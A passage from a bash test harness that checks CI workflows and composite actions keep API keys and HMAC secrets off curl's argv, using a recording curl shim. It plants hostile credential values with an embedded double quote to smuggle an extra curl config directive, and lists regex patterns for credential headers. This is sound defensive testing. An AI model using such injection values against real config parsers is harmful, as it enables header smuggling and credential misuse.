    [[ "$RUN_RC" -eq 78 && "$EV_CALLS" -eq 0 ]] && ! grep -aqF -- "$FIXTURE_TOKEN" "$RUN_ROW/stdout" "$RUN_ROW/stderr" || bad+=" [$v $mode: rc=$RUN_RC calls=$EV_CALLS]"
  done
done
if [[ -z "$bad" ]]; then row "check-deploy-script-parity: refuses xtrace (env and flag forms) with a live credential: rc 78, zero calls, no token on output" ok
else row "check-deploy-script-parity: refuses xtrace (env and flag forms) with a live credential: rc 78, zero calls, no token on output" fail "$bad"; fi
hm5_mut "$PAR" bearer '*[!A-Za-z0-9._~+/=-]*) return 1' '*[!A-Za-z0-9._~+/=\"-]*) return 1'
PARSB="$HMX/sb-par"; assert_fixture_dir "$PARSB"; mkdir -p "$PARSB/scripts"; ln -sfn "$REPO_ROOT/apps" "$PARSB/apps"   # ROOT = the sandbox; the infra files it reads come through the symlink
cp "$HM5_MUT" "$PARSB/scripts/check-deploy-script-parity.sh"
PAR_SCRIPT="$PARSB/scripts/check-deploy-script-parity.sh"
par_run par-Mbearer "CF_ACCESS_CLIENT_SECRET=$(tok_for quote)"; evaluate_hmac "$RUN_ROW" 'deploy\.soleur\.ai' 0
PAR_SCRIPT=""
if [[ "$(bk_calls "$RUN_ROW")" -ge 1 && " $EV_FAILED " == *" injected "* ]]; then row "check-deploy-script-parity: mutant admitting the double quote in _bearer_ok sends the hostile secret and the shim records INJECTED" ok
else row "check-deploy-script-parity: mutant admitting the double quote in _bearer_ok sends the hostile secret and the shim records INJECTED" fail "calls=$(bk_calls "$RUN_ROW") failed='$EV_FAILED'"; fi
echo "=== stage S2-C: deploy-webhook triple (parity script and four probes) done ==="

# =====================================================================================
# STAGE S3 (argv-bearer sweep S3, ADR-280): workflow YAML and the two composite actions send their credential
# through scripts/lib/bearer-curl.sh. The library's own contract (hostile/empty/unset values at every spec position,
# the byte sweep, the HMAC oracle, xtrace, the chokepoint census) is proved in scripts/lib/bearer-curl.test.sh; THIS
# stage proves the SITES: the population is derived from the tree, each member is checked structurally, and the
# representative call sites are EXECUTED (the real `run:` body, or a recorded slice whose drift from the live step
# text is pinned by a row) under a recording curl shim with the credential empty, hostile and well-formed. A row asserts
# the site's verdict class (red step, soft verdict or warning), the marker exactly once, zero requests for a refusal,
# and the planted canary in no output. The scheduled-inngest-health probe step was HELD BACK by S3 (its infra suite builds a
# fake workspace); S4 converted it, so no member of this population may carry an argv site any more. S4 added five more
# members (the Supabase, GitHub App, restart-webhook and deploy-pipeline-fix workflows and the mint composite); the stage
# below this one (STAGE S4) judges the script consumers of the library and the inline-wrapper files.
# =====================================================================================
S3="$TMPD/s3"; assert_fixture_dir "$S3"; mkdir -p "$S3/shim" "$S3/real" "$S3/rows"
cat > "$S3/shim/curl" <<'S3SHIM'
#!/usr/bin/env bash
# Recording curl for the S3 stage. Synthesized: answers SHIM_CODE (default 200) with SHIM_BODY (default {}).
d="${CALLS_DIR:?}"
n=$(( $(find "$d" -name '*.argv' | wc -l) + 1 ))
printf '%s\0' "$@" > "$d/$n.argv"
out=""; wfmt=""; prev=""; cfg=0
for a in "$@"; do
  [[ "$prev" == "-o" ]] && out="$a"
  [[ "$prev" == "-w" ]] && wfmt="$a"
  [[ "$prev" == "--config" && "$a" == "-" ]] && cfg=1
  prev="$a"
done
[[ "$cfg" -eq 1 ]] && cat > "$d/$n.stdin"
code="${SHIM_CODE:-200}"; body="${SHIM_BODY-}"; [[ -n "$body" ]] || body='{}'
if [[ -n "$out" ]]; then
  [[ "$out" == /dev/null ]] || printf '%s' "$body" > "$out"
else
  printf '%s' "$body"
fi
if [[ -n "$wfmt" ]]; then
  fmt="${wfmt//%\{http_code\}/$code}"
  printf '%b' "$fmt"
fi
exit "${SHIM_RC:-0}"
S3SHIM
chmod +x "$S3/shim/curl"
for t in bash cat date grep sed tr awk head tail jq mktemp rm mkdir env dirname basename cut wc sort tee python3 openssl find printf; do
  p="$(type -P "$t" || true)"; [[ -n "$p" ]] && ln -s "$p" "$S3/real/$t"
done
[[ -e "$S3/real/python3" && -e "$S3/real/jq" ]] || fatal "stage S3: python3 and jq are required"
mkdir -p "$S3/real-nopy"
for t in "$S3"/real/*; do [[ "$(basename "$t")" == python3 ]] || ln -s "$(readlink "$t")" "$S3/real-nopy/$(basename "$t")"; done
S3_CANARY="S3CANARYsecret0123"
S3_K_ANTH="synth-anthropic""_key-0123"   # split literal: no contiguous key-shaped string in the source
s3_pop_py='
import sys, re, glob, yaml
files = sorted(glob.glob(".github/workflows/*.yml")) + sorted(glob.glob(".github/actions/*/action.yml"))
for f in files:
    d = yaml.safe_load(open(f))
    steps = []
    if isinstance(d.get("runs"), dict):
        steps = d["runs"].get("steps") or []
    else:
        for j in (d.get("jobs") or {}).values():
            steps += (j.get("steps") or []) if isinstance(j, dict) else []
    if any(isinstance(s.get("run"), str) and "scripts/lib/bearer-curl.sh" in s["run"] for s in steps if isinstance(s, dict)):
        print(f)
'
s3_step_py='
import sys, yaml
f, sel = sys.argv[1], sys.argv[2]
d = yaml.safe_load(open(f))
steps = []
if isinstance(d.get("runs"), dict):
    steps = d["runs"].get("steps") or []
else:
    for j in (d.get("jobs") or {}).values():
        steps += (j.get("steps") or []) if isinstance(j, dict) else []
for s in steps:
    if isinstance(s, dict) and isinstance(s.get("run"), str) and (s.get("id") == sel or str(s.get("name", "")).startswith(sel)):
        sys.stdout.write(s["run"]); sys.exit(0)
sys.exit(3)
'
s3_body() { python3 -I -c "$s3_step_py" "$1" "$2"; } # <file> <step id|name prefix> -> the step's run: text
S3_N=0
s3_run() { # <bodyfile> <realdir> <KEY=VAL>...  -> S3_RC S3_OUT S3_GHO S3_NCALLS
  local body="$1" realdir="$2"; shift 2
  S3_N=$((S3_N + 1)); local r="$S3/rows/r$S3_N"; assert_fixture_dir "$r"; mkdir -p "$r/calls" "$r/rt"
  : > "$r/gho"; : > "$r/summary"
  S3_RC=0
  ( cd "$REPO_ROOT" && env -i PATH="$S3/shim:$realdir" HOME="$r" TMPDIR="$r" RUNNER_TEMP="$r/rt" GITHUB_OUTPUT="$r/gho" GITHUB_STEP_SUMMARY="$r/summary" \
      GITHUB_WORKSPACE="$REPO_ROOT" CALLS_DIR="$r/calls" "$@" \
      "$BASH_BIN" --noprofile --norc -eo pipefail "$body" ) > "$r/out" 2>&1 || S3_RC=$?
  S3_OUT="$r/out"; S3_GHO="$r/gho"; S3_DIR_ROW="$r"
  S3_NCALLS="$(find "$r/calls" -name '*.argv' | wc -l | tr -d ' ')"
}
s3_marker_count() { grep -c '^SOLEUR_CREDENTIAL_REFUSED script=' "$S3_OUT" || true; }
s3_canary_clean() { # the planted canary appears in no captured output, annotation or summary
  ! grep -qF -- "$S3_CANARY" "$S3_OUT" "$S3_GHO" "$S3_DIR_ROW/summary" 2>/dev/null
}
s3_tok_not_in_argv() { # <value>: no recorded argv holds it
  local f; for f in "$S3_DIR_ROW"/calls/*.argv; do [[ -e "$f" ]] || continue; grep -qF -- "$1" < <(tr '\0' '\n' < "$f") && return 1; done; return 0
}
s3_gho_has() { grep -qx -- "$1" "$S3_GHO"; }
s3_argv_has() { grep -qxF -- "$2" < <(tr '\0' '\n' < "$1"); } # <argvfile> <word>: the recorded call carries that exact argument
S3_ACT_PRE=".github/actions/anthropic-preflight/action.yml"
S3_ACT_NOT=".github/actions/notify-ops-email/action.yml"

# ---- instrument controls: the shim records, honours -w/-o, and a run sees the library ----
s3_body "$S3_ACT_PRE" check > "$S3/pre.sh" || fatal "S3 could not extract the anthropic-preflight step"
s3_run "$S3/pre.sh" "$S3/real" ANTHROPIC_API_KEY="$S3_K_ANTH"
[[ "$S3_RC" == 0 && "$S3_NCALLS" == 1 ]] && s3_gho_has "ok=true" || fatal "S3 control: the well-formed anthropic-preflight run is not green under the shim (rc=$S3_RC calls=$S3_NCALLS)"
[[ "$(tr '\0' '\n' < "$S3_DIR_ROW/calls/1.stdin" 2>/dev/null)" == "header = \"x-api-key: ${S3_K_ANTH}\"" ]] || fatal "S3 control: the shim did not record the credential on stdin"
row "S3 control: the real anthropic-preflight body runs under the recording shim; the key reaches stdin as ONE header directive" ok
s3_tok_not_in_argv "$S3_K_ANTH" && row "S3 anthropic-preflight: a well-formed key is absent from the recorded argv" ok || row "S3 anthropic-preflight: a well-formed key is absent from the recorded argv" fail "key found in argv"

# ---- THE POPULATION IS DERIVED from the tree, never counted ----
S3_POP="$(cd "$REPO_ROOT" && python3 -I -c "$s3_pop_py" | sort)"
S3_MANIFEST="$(printf '%s\n' \
  .github/actions/anthropic-preflight/action.yml .github/actions/notify-ops-email/action.yml \
  .github/workflows/board-status-sync.yml .github/workflows/canary-status.yml .github/workflows/git-data-cutover.yml \
  .github/workflows/git-data-rung2-rehearsal.yml .github/workflows/kb-drift-walker.yml .github/workflows/rule-audit.yml \
  .github/workflows/scheduled-inngest-health.yml .github/workflows/scheduled-prod-version-drift.yml \
  .github/workflows/scheduled-terraform-drift.yml .github/workflows/sentry-audit-gate.yml \
  .github/actions/mint-infra-app-token/action.yml .github/workflows/apply-deploy-pipeline-fix.yml \
  .github/workflows/apply-github-infra.yml .github/workflows/apply-inngest-rls.yml \
  .github/workflows/restart-inngest-server.yml .github/workflows/apply-web-platform-infra.yml | sort)"
S3_UNCLASS="$(comm -23 <(printf '%s\n' "$S3_POP") <(printf '%s\n' "$S3_MANIFEST"))"
S3_STALE="$(comm -13 <(printf '%s\n' "$S3_POP") <(printf '%s\n' "$S3_MANIFEST"))"
if [[ -z "$S3_UNCLASS" && -z "$S3_STALE" && -n "$S3_POP" ]]; then
  row "S3 population: every step that sources the library is in the manifest and every manifest member still does ($(printf '%s\n' "$S3_POP" | grep -c .) files)" ok
else
  row "S3 population: the derived set differs from the manifest" fail "unclassified='${S3_UNCLASS//$'\n'/,}' stale='${S3_STALE//$'\n'/,}'"
fi
# Rule E (the lint decides what an argv credential is): every member is clean. S3 declared one held-back site (the
# scheduled-inngest-health probe step); S4 converted it, so the exception is gone and a re-added argv site anywhere turns this red.
S3_E_BAD=""
for f in $S3_POP; do
  n="$(cd "$REPO_ROOT" && python3 scripts/lint-shell-trace-credential-refusal.py "$f" 2>&1 | grep -c 'credential header on curl argv\|HMAC\|-hmac' || true)"
  if [[ "$n" != 0 ]]; then S3_E_BAD+=" $f=$n"; fi
done
if [[ -z "$S3_E_BAD" ]]; then
  row "S3 Rule E: every member is clean (the inngest-health probe left its held-back state in S4)" ok
else
  row "S3 Rule E: members carry argv credentials" fail "bad=$S3_E_BAD"
fi

# ---- structural rows over the derived population (statement-level: continuation lines are joined) ----
s3_statements_py='
import sys, yaml
f = sys.argv[1]
d = yaml.safe_load(open(f))
steps = []
if isinstance(d.get("runs"), dict):
    steps = d["runs"].get("steps") or []
else:
    for j in (d.get("jobs") or {}).values():
        steps += (j.get("steps") or []) if isinstance(j, dict) else []
for i, s in enumerate(steps):
    run = s.get("run") if isinstance(s, dict) else None
    if not isinstance(run, str) or "bc_curl" not in run and "scripts/lib/bearer-curl.sh" not in run:
        continue
    text = run.replace("\\\n", " ")
    for ln in text.split("\n"):
        print("%d\t%s" % (i, ln))
'
# The D2/D3/D5 predicates, as functions over ONE line, so the live sweep below and the fixture table after it run the
# SAME patterns (a pattern nothing ever fed a known positive and a known negative is not a control).
S3_D2_RE='(-H|--header) *["'"'"']?(Authorization|Proxy-Authorization|x-api-key|api-key|apikey|private-token|x-auth-token|x-access-token|Cookie|X-Signature-256|X-Hub-Signature|CF-Access-Client|X-Soleur-Kb-Drift-Signature)'
S3_D3_RE='(2|&)> *(/dev/null|&-)|>& *(/dev/null|-)|> */dev/null +2>&1'
S3_D5_RE='(\[\[? [^]]*(-eq|-ne|==|!=|=) *"?2"? *\]\]?|\(\([^)]*(==|!=|-eq|-ne) *2([^0-9A-Za-z_]|$)[^)]*\)\)|case .*(\$\?|\$\{?[A-Za-z_]*[rR][cC]))'
s3_d2_hit() { grep -qiE -- "$S3_D2_RE" <<<"$1"; }
s3_d3_hit() { grep -qE -- "$S3_D3_RE" <<<"$1"; }
s3_d5_hit() { grep -qE -- "$S3_D5_RE" <<<"$1" && grep -qE '(_RC|rc|\$\?)' <<<"$1" && ! grep -q 'exit 2' <<<"$1"; }
S3_PRED_BAD=""
s3_pred_check() { # <predicate> <HIT|MISS> <line>
  local want="$2" got=MISS
  "$1" "$3" && got=HIT
  [[ "$got" == "$want" ]] || S3_PRED_BAD+=" [$1 wanted $want for: ${3:0:48}]"
}
for l in "bc_curl x 'A:B:C' -- -H 'Authorization: Bearer z' url" 'bc_curl x A -- -H "Authorization: z" url' "bc_curl x A -- --header 'x-api-key: z' url" 'bc_curl x A -- -H "Cookie: a" url' "bc_curl x A -- -H 'Private-Token: z' url"; do s3_pred_check s3_d2_hit HIT "$l"; done
for l in 'bc_curl x A -- -H "Content-Type: application/json" url' "bc_curl x A -- -H 'Accept: x' url" 'bc_curl x A -- -o /dev/null -w %{http_code} url'; do s3_pred_check s3_d2_hit MISS "$l"; done
for l in 'bc_curl x A -- -sS url 2>/dev/null' 'bc_curl x A -- -sS url 2> /dev/null' 'bc_curl x A -- -sS url &>/dev/null' 'bc_curl x A -- -sS url >/dev/null 2>&1' 'bc_curl x A -- -sS url 2>&-'; do s3_pred_check s3_d3_hit HIT "$l"; done
for l in "bc_curl x A -- -sS -o /dev/null -w '%{http_code}' url" 'bc_curl x A -- -sS url 2>"$LOG"' 'bc_curl x A -- -sS url 2>&1'; do s3_pred_check s3_d3_hit MISS "$l"; done
for l in '[[ "$rc" -eq 2 ]]' '[ "$rc" = 2 ]' '[ "$rc" = "2" ]' '(( rc == 2 ))' '(( $rc == 2 ))' '(( rc != 0 && rc == 2 ))' 'case "$rc" in' '[[ "$?" -ne 2 ]]'; do s3_pred_check s3_d5_hit HIT "$l"; done
for l in '[[ "$rc" -eq 0 ]]' '[[ "$rc" -eq 20 ]]' '[[ "$rc" -eq 2 ]] && exit 2' 'echo "got 2 files"' '(( rc == 0 ))'; do s3_pred_check s3_d5_hit MISS "$l"; done
[[ -z "$S3_PRED_BAD" ]] && row "S3 structure: the D2/D3/D5 sweep predicates flag every known-bad spelling (quotes, spacing, the &> and >&2 forms, bracket and arithmetic and case forms) and spare the benign neighbours" ok || row "S3 structure: a D2/D3/D5 predicate misjudges a fixture" fail "$S3_PRED_BAD"
S3_SRC_BAD=""; S3_ARGV_BAD=""; S3_STDERR_BAD=""; S3_HMAC_BAD=""; S3_PATH_BAD=""; S3_RC2_BAD=""; S3_NAME_BAD=""; S3_CALLS=0
for f in $S3_POP; do
  stm="$(cd "$REPO_ROOT" && python3 -I -c "$s3_statements_py" "$f")"
  # D1 the library is sourced (exact pinned form) before the first bc_curl/bc_ok/bc_hmac/bc_refuse of the same step
  steps_with_calls="$(printf '%s\n' "$stm" | grep -E 'bc_(curl|ok|refuse|hmac_sha256_hex)[ "$]' | cut -f1 | sort -u)"
  for st in $steps_with_calls; do
    first_use="$(printf '%s\n' "$stm" | awk -F'\t' -v s="$st" '$1==s && $2 !~ /^[[:space:]]*#/ && $2 ~ /bc_(curl|ok|refuse|hmac_sha256_hex)[ "$]/ && $2 !~ /source / {print NR; exit}')"
    first_src="$(printf '%s\n' "$stm" | awk -F'\t' -v s="$st" '$1==s && $2 ~ /source / && $2 ~ /scripts\/lib\/bearer-curl\.sh/ {print NR; exit}')"
    [[ -n "$first_src" && -n "$first_use" && "$first_src" -le "$first_use" ]] || S3_SRC_BAD+=" $f#$st"
  done
  S3_CALLS=$((S3_CALLS + $(printf '%s\n' "$stm" | grep -cE '(^|[^_A-Za-z])bc_curl [A-Za-z]' || true)))
  # the source token has exactly one accepted spelling
  while IFS= read -r l; do
    grep -qE 'source "\$\{GITHUB_WORKSPACE:\?\}/scripts/lib/bearer-curl\.sh"|source "\$GITHUB_WORKSPACE/scripts/lib/bearer-curl\.sh"|source "\$\{GITHUB_WORKSPACE\}/scripts/lib/bearer-curl\.sh"' <<<"$l" || S3_PATH_BAD+=" $f"
  done < <(printf '%s\n' "$stm" | cut -f2 | grep -E '^[[:space:]]*(if .*)?source .*bearer-curl\.sh|\|\| ! source|! source .*bearer-curl' || true)
  # D2 no credential header literal inside a bc_curl statement (it would be a second, argv copy), and no -H credential on a curl line
  while IFS= read -r l; do s3_d2_hit "$l" && S3_ARGV_BAD+=" $f"; done < <(printf '%s\n' "$stm" | cut -f2 | grep -E '(^|[^_A-Za-z])bc_curl ' || true)
  # D3 no stderr suppression on a bc_curl statement
  # (the statement is the bc_curl call itself: a later pipe stage such as `| jq ... 2>/dev/null` is not its stderr)
  while IFS= read -r l; do s3_d3_hit "$l" && S3_STDERR_BAD+=" $f"; done < <(printf '%s\n' "$stm" | cut -f2 | grep -E '(^|[^_A-Za-z])bc_curl ' | sed -E 's/.*(bc_curl .*)/\1/; s/ \|\| .*//; s/ \| .*//' || true)
  # D4 no openssl -hmac in a converted file (no exception remains: the probe step converted in S4)
  grep -qE 'openssl dgst .*-hmac' < <(grep -v '^[[:space:]]*#' "$REPO_ROOT/$f") && S3_HMAC_BAD+=" $f"

  # D5 no converted statement branches on rc == 2 (curl's own init-failure code; the marker is the discriminator)
  while IFS= read -r l; do s3_d5_hit "$l" && S3_RC2_BAD+=" $f"; done < <(printf '%s\n' "$stm" | cut -f2 || true)
  # D6 every bc_curl / bc_refuse names ITS OWN file in the marker (a copy-pasted donor name makes the marker unfindable)
  want_name="$(basename "$f" .yml)"; [[ "$(basename "$f")" == action.yml ]] && want_name="$(basename "$(dirname "$f")")"
  while IFS= read -r nm; do [[ "$nm" == "$want_name" ]] || S3_NAME_BAD+=" $f:$nm"; done < <(printf '%s\n' "$stm" | cut -f2 | grep -v '^[[:space:]]*#' | grep -oE '(^|[^_A-Za-z])bc_(curl|refuse)[ ]+[A-Za-z0-9._-]+' | awk '{print $NF}' | sort -u || true)
done
[[ -z "$S3_SRC_BAD" ]] && row "S3 structure: every step that calls the library sources it first (exact pinned source form)" ok || row "S3 structure: a step uses the library before it sources it" fail "$S3_SRC_BAD"
[[ -z "$S3_PATH_BAD" ]] && row "S3 structure: the library is sourced only from the job's own workspace (\${GITHUB_WORKSPACE})" ok || row "S3 structure: a non-workspace source path" fail "$S3_PATH_BAD"
[[ -z "$S3_ARGV_BAD" ]] && row "S3 structure: no bc_curl statement repeats a credential header on its own argument list" ok || row "S3 structure: a bc_curl statement carries -H credential" fail "$S3_ARGV_BAD"
[[ -z "$S3_STDERR_BAD" ]] && row "S3 structure: no bc_curl statement discards stderr (the refusal marker must stay visible)" ok || row "S3 structure: 2>/dev/null on bc_curl" fail "$S3_STDERR_BAD"
[[ -z "$S3_NAME_BAD" ]] && row "S3 structure: every bc_curl / bc_refuse call names its own file in the marker" ok || row "S3 structure: a marker names another file" fail "$S3_NAME_BAD"
[[ -z "$S3_HMAC_BAD" ]] && row "S3 structure: no converted file computes an HMAC with the key on openssl's argv" ok || row "S3 structure: openssl -hmac remains" fail "$S3_HMAC_BAD"
[[ -z "$S3_RC2_BAD" ]] && row "S3 structure: no converted statement branches on rc == 2 (the marker is the discriminator)" ok || row "S3 structure: a site branches on rc 2" fail "$S3_RC2_BAD"
# The floor is the realized count (the YAML population after S4 converted the five more files and the inngest-health probe). BOTH operands are literals above the `if`.
S3_CALLS_FLOOR=41
if [[ "$S3_CALLS" -ge "$S3_CALLS_FLOOR" ]]; then row "S3 structure: the derived population holds >= $S3_CALLS_FLOOR bc_curl call statements ($S3_CALLS)" ok; else row "S3 structure: population floor" fail "only $S3_CALLS bc_curl statements derived (floor $S3_CALLS_FLOOR)"; fi

# ---- anthropic-preflight (the soft-skip trap: a refusal must stay RED) ----
s3_run "$S3/pre.sh" "$S3/real" ANTHROPIC_API_KEY="${S3_CANARY}\"x"
if [[ "$S3_RC" == 1 && "$S3_NCALLS" == 0 && "$(s3_marker_count)" == 1 ]] && ! s3_gho_has "ok=false" && ! s3_gho_has "ok=true" && s3_canary_clean; then
  row "S3 anthropic-preflight: a malformed key exits 1 (red), makes zero requests, prints the marker once, and never writes ok=false (the soft-skip arm)" ok
else row "S3 anthropic-preflight: malformed key" fail "rc=$S3_RC calls=$S3_NCALLS markers=$(s3_marker_count) gho=$(tr '\n' ' ' < "$S3_GHO")"; fi
s3_run "$S3/pre.sh" "$S3/real" ANTHROPIC_API_KEY=""
[[ "$S3_RC" == 1 && "$S3_NCALLS" == 0 ]] && grep -q '^::error::ANTHROPIC_API_KEY not set' "$S3_OUT" && row "S3 anthropic-preflight: an empty key keeps its own message and exits 1" ok || row "S3 anthropic-preflight: empty key" fail "rc=$S3_RC"
s3_run "$S3/pre.sh" "$S3/real" ANTHROPIC_API_KEY="$S3_K_ANTH" GITHUB_WORKSPACE="$S3/rows"
[[ "$S3_RC" == 1 && "$S3_NCALLS" == 0 ]] && grep -q '^::error::scripts/lib/bearer-curl.sh could not be loaded' "$S3_OUT" && row "S3 anthropic-preflight: library absent from the checkout is a hard failure with no request and no argv fallback" ok || row "S3 anthropic-preflight: library absent" fail "rc=$S3_RC calls=$S3_NCALLS"
s3_run "$S3/pre.sh" "$S3/real" ANTHROPIC_API_KEY="$S3_K_ANTH" SHIM_CODE=503
[[ "$S3_RC" == 0 && "$S3_NCALLS" == 1 ]] && s3_gho_has "ok=false" && row "S3 anthropic-preflight: a 5xx still soft-skips (ok=false, exit 0): the transient arm is unchanged" ok || row "S3 anthropic-preflight: 5xx" fail "rc=$S3_RC"
s3_run "$S3/pre.sh" "$S3/real" ANTHROPIC_API_KEY="$S3_K_ANTH" SHIM_CODE=000 SHIM_RC=7
[[ "$S3_RC" == 1 ]] && grep -q 'Unexpected Anthropic preflight response' "$S3_OUT" && row "S3 anthropic-preflight: a transport failure keeps the documented 000000 quirk (red), not a refusal" ok || row "S3 anthropic-preflight: transport failure" fail "rc=$S3_RC"

# ---- notify-ops-email (caller contract: warn-only except a missing key / library) ----
s3_body "$S3_ACT_NOT" send > "$S3/not.sh" || fatal "S3 could not extract the notify-ops-email step"
s3_run "$S3/not.sh" "$S3/real" RESEND_API_KEY="synth-resend_key0123" EMAIL_SUBJECT=s EMAIL_BODY=b
[[ "$S3_RC" == 0 && "$S3_NCALLS" == 1 ]] && s3_gho_has "sent=true" && row "S3 notify-ops-email: a well-formed key sends (sent=true) with the key on stdin only" ok || row "S3 notify-ops-email: well-formed" fail "rc=$S3_RC calls=$S3_NCALLS"
s3_tok_not_in_argv "synth-resend_key0123" && row "S3 notify-ops-email: the key is absent from the recorded argv" ok || row "S3 notify-ops-email: key in argv" fail ""
s3_run "$S3/not.sh" "$S3/real" RESEND_API_KEY="${S3_CANARY}\"x" EMAIL_SUBJECT=s EMAIL_BODY=b
if [[ "$S3_RC" == 0 && "$S3_NCALLS" == 0 && "$(s3_marker_count)" == 1 ]] && s3_gho_has "sent=false" && grep -q '^::error::RESEND_API_KEY failed the token-shape guard' "$S3_OUT" && s3_canary_clean; then
  row "S3 notify-ops-email: a malformed key is an ::error:: annotation with the marker, sent=false, exit 0 and NO request (caller contract kept)" ok
else row "S3 notify-ops-email: malformed key" fail "rc=$S3_RC calls=$S3_NCALLS markers=$(s3_marker_count)"; fi
s3_run "$S3/not.sh" "$S3/real" RESEND_API_KEY="synth-resend_key0123" EMAIL_SUBJECT=s EMAIL_BODY=b GITHUB_WORKSPACE="$S3/rows"
[[ "$S3_RC" == 1 && "$S3_NCALLS" == 0 ]] && s3_gho_has "sent=false" && row "S3 notify-ops-email: library absent is a hard failure (exit 1, sent=false, no request)" ok || row "S3 notify-ops-email: library absent" fail "rc=$S3_RC"
s3_run "$S3/not.sh" "$S3/real" RESEND_API_KEY="" EMAIL_SUBJECT=s EMAIL_BODY=b
[[ "$S3_RC" == 1 && "$S3_NCALLS" == 0 ]] && s3_gho_has "sent=false" && row "S3 notify-ops-email: a MISSING key keeps its exit 1" ok || row "S3 notify-ops-email: missing key" fail "rc=$S3_RC"

# ---- canary-status: the HMAC representative (key off openssl's argv, python3 absent, empty and hostile values) ----
s3_body ".github/workflows/canary-status.yml" "Read /hooks/deploy-status" > "$S3/canary.sh" || fatal "S3 could not extract the canary-status step"
CANARY_BODY='{"sandbox_canary":{"verdict":"pass","consecutive_pass":5,"first_pass_at":1,"checked_at":86401,"sdk_version":"1.0.0"}}'
s3_run "$S3/canary.sh" "$S3/real" WEBHOOK_DEPLOY_SECRET="synth-webhook-key-0123" CF_ACCESS_CLIENT_ID="synthid.access" CF_ACCESS_CLIENT_SECRET="synthsecret0123" SHIM_BODY="$CANARY_BODY"
S3_WANT_SIG="$(printf '' | "$REAL_OSSL" dgst -sha256 -hmac "synth-webhook-key-0123" | sed 's/.*= //')"
if [[ "$S3_RC" == 0 && "$S3_NCALLS" == 1 && "$(grep -c . "$S3_DIR_ROW/calls/1.stdin")" == 3 ]] && [[ "$(sed -n 1p "$S3_DIR_ROW/calls/1.stdin")" == "header = \"X-Signature-256: sha256=$S3_WANT_SIG\"" ]]; then
  row "S3 canary-status: the signature equals the independent openssl digest and rides stdin with the Cloudflare Access pair (three directives)" ok
else row "S3 canary-status: well-formed run" fail "rc=$S3_RC calls=$S3_NCALLS"; fi
if s3_tok_not_in_argv "$S3_WANT_SIG" && s3_tok_not_in_argv "synth-webhook-key-0123" && s3_tok_not_in_argv "synthsecret0123"; then row "S3 canary-status: neither the HMAC key, the signature nor the Cloudflare Access secret is in any recorded argv" ok; else row "S3 canary-status: credential in argv" fail ""; fi
s3_run "$S3/canary.sh" "$S3/real-nopy" WEBHOOK_DEPLOY_SECRET="synth-webhook-key-0123" CF_ACCESS_CLIENT_ID="synthid.access" CF_ACCESS_CLIENT_SECRET="synthsecret0123"
if [[ "$S3_RC" == 1 && "$S3_NCALLS" == 0 && "$(s3_marker_count)" == 0 ]] && grep -q '^::error::the request signature could not be computed' "$S3_OUT"; then
  row "S3 canary-status: python3 absent -> the arm's own red verdict (::error::, no credential-refusal marker: the key was never judged), zero requests, no mute abort" ok
else row "S3 canary-status: python3 absent" fail "rc=$S3_RC calls=$S3_NCALLS markers=$(s3_marker_count)"; fi
s3_run "$S3/canary.sh" "$S3/real" WEBHOOK_DEPLOY_SECRET="synth-webhook-key-0123" CF_ACCESS_CLIENT_ID="${S3_CANARY}\"x" CF_ACCESS_CLIENT_SECRET="synthsecret0123"
if [[ "$S3_RC" != 0 && "$S3_NCALLS" == 0 && "$(s3_marker_count)" == 1 ]] && s3_canary_clean; then
  row "S3 canary-status: a hostile Cloudflare Access id is refused (red, zero requests, marker once, canary absent)" ok
else row "S3 canary-status: hostile CF id" fail "rc=$S3_RC calls=$S3_NCALLS markers=$(s3_marker_count)"; fi
s3_run "$S3/canary.sh" "$S3/real" WEBHOOK_DEPLOY_SECRET="synth-webhook-key-0123" CF_ACCESS_CLIENT_ID="synthid.access" CF_ACCESS_CLIENT_SECRET="synthsecret0123" SHIM_CODE=403
[[ "$S3_RC" == 1 ]] && grep -q '^::error::deploy-status returned HTTP 403' "$S3_OUT" && row "S3 canary-status: a non-200 keeps its verdict (::error:: HTTP 403, exit 1)" ok || row "S3 canary-status: 403" fail "rc=$S3_RC"

# ---- kb-drift-walker: the HMAC moved from an inline python3 -c (key exported) to the library (key not exported) ----
# The live step text is executed with two edits that only remove the repo walker and the host-wide /tmp path; each edit is
# asserted to have landed. doppler is a stub that answers by secret NAME.
mkdir -p "$S3/kbstub"
cat > "$S3/kbstub/doppler" <<'KBDOPPLER'
#!/usr/bin/env bash
case "$*" in
  *KB_DRIFT_INGEST_SIGNING_KEY*) [[ "${KB_DOPPLER_FAIL:-}" == 1 ]] && exit 1; printf '%s' "${KB_KEY-}" ;;
  *KB_DRIFT_INGEST_URL*) printf '%s' "https://ingest.invalid/kb" ;;
  *) exit 64 ;;
esac
KBDOPPLER
chmod +x "$S3/kbstub/doppler"
s3_body ".github/workflows/kb-drift-walker.yml" "Run walker" > "$S3/kb.live.sh" || fatal "S3 could not extract the kb-drift-walker step"
KB_FINDINGS='{"findings":[{"id":"synthetic-1"}]}'
sed -e "s#^FINDINGS_JSON=.*#FINDINGS_JSON='$KB_FINDINGS'#" -e 's#/tmp/ingest\.out#"$RUNNER_TEMP"/ingest.out#g' "$S3/kb.live.sh" > "$S3/kb.sh"
if ! grep -q "^FINDINGS_JSON='" "$S3/kb.sh" || grep -q 'scripts/kb-drift-walker.sh' "$S3/kb.sh" || grep -q '/tmp/ingest.out' "$S3/kb.sh"; then fatal "S3 kb-drift-walker row edits did not land"; fi
KB_REALDIR="$S3/kbstub:$S3/real"
KB_WANT_SIG="$(printf '%s' "$KB_FINDINGS" | "$REAL_OSSL" dgst -sha256 -hmac "synth-kb-signing-key-0123" | sed 's/.*= //')"
s3_run "$S3/kb.sh" "$KB_REALDIR" KB_KEY="synth-kb-signing-key-0123"
if [[ "$S3_RC" == 0 && "$S3_NCALLS" == 1 && "$(tr '\0' '\n' < "$S3_DIR_ROW/calls/1.stdin")" == "header = \"X-Soleur-Kb-Drift-Signature: sha256=$KB_WANT_SIG\"" ]]; then
  row "S3 kb-drift-walker: the signature equals the independent openssl digest and is the only line on the stdin config" ok
else row "S3 kb-drift-walker: well-formed run" fail "rc=$S3_RC calls=$S3_NCALLS"; fi
if s3_tok_not_in_argv "$KB_WANT_SIG" && s3_tok_not_in_argv "synth-kb-signing-key-0123"; then row "S3 kb-drift-walker: neither the signing key nor the signature is in any recorded argv" ok; else row "S3 kb-drift-walker: credential in argv" fail ""; fi
s3_run "$S3/kb.sh" "$KB_REALDIR" KB_KEY=""
if [[ "$S3_RC" == 1 && "$S3_NCALLS" == 0 && "$(s3_marker_count)" == 0 ]] && grep -q '^::error::the ingest signature could not be computed' "$S3_OUT"; then
